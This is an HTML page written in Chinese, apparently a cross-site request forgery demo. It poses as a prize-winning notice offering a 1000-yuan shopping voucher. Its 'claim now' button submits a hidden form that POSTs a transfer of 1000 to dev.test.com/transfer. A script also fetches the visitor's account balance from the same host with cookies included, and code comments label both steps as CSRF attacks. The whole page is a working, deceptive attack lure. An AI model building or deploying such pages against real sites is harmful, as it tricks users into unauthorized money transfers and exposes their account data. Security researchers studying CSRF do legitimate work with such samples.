<!DOCTYPE html>
<html>
<head>
    <title>免费抽奖</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f5f5f5;
        }
        .container {
            background: white;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            text-align: center;
        }
        h1 {
            color: #e74c3c;
        }
        .prize-image {
            width: 200px;
            margin: 20px 0;
        }
        .hidden-form {
            display: none;
        }
        .balance-info {
            margin-top: 20px;
            padding: 10px;
            background-color: #f8f9fa;
            border-radius: 4px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎉 恭喜您中奖了！🎉</h1>
        <img src="https://via.placeholder.com/200x200" alt="奖品图片" class="prize-image">
        <p>您获得了价值1000元的购物券！</p>
        <p>请点击下方按钮领取奖品：</p>
        <button onclick="submitForm()">立即领取</button>

        <!-- 添加余额显示区域 -->
        <div class="balance-info">
            <h3>您的账户信息</h3>
            <p>当前余额：<span id="balance">加载中...</span></p>
        </div>
    </div>

    <!-- 隐藏的CSRF表单 -->
    <form id="csrf-form" class="hidden-form" action="http://dev.test.com/transfer" method="POST">
        <input type="hidden" name="amount" value="1000">
    </form>

    <script>
        function submitForm() {
            document.getElementById('csrf-form').submit();
        }
        // 添加GET请求的CSRF攻击
        fetch('http://dev.test.com/balance', {
            method: 'GET',
            credentials: 'include'  // 包含cookies
        })
        .then(response => response.json())
        .then(data => {
            document.getElementById('balance').textContent = `¥ ${data.balance}`;
        })
        .catch(error => {
            document.getElementById('balance').textContent = '获取失败';
            console.error('Error:', error);
        });
    </script>
</body>
</html> 